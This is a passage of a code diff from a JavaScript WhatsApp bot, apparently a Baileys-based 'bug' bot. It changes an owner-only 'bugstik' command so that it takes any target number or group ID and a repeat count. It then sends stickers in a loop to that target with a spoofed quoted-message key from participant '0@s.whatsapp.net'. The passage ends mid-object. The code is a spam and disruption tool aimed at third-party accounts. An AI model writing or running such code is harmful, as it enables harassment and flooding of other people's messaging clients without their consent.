@@ -3873,11 +3873,15 @@ break
 
 case 'bugstik':{
 if (!isOwner) return reply ('khsus owner')
-if (args.length == 0) return reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
-jumlah = `${encodeURI(q)}`
+if (args.length < 1) return reply(`*Syntax Error!*\n\nUse : ${command} no atau idgc|amount spam\nExample : ${command} 62888@g.us|1 \n\nDi Usahakan Bot Udah Masuk Group Nya`)
+
+//if (args.length == 0) return reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
+//jumlah = `${encodeURI(q)}`
+num = q.split('|')[0]
+jumlah = q.split('|')[1]
 ydd = `Hallo Aku bot wea`
 for (let i = 0; i < jumlah; i++) {
-aqua.sendMessage(m.chat, {sticker: thumb},{quoted: {
+aqua.sendMessage(num, {sticker: thumb},{quoted: {
 key: { 
 fromMe: false, 
 participant: `0@s.whatsapp.net`, 
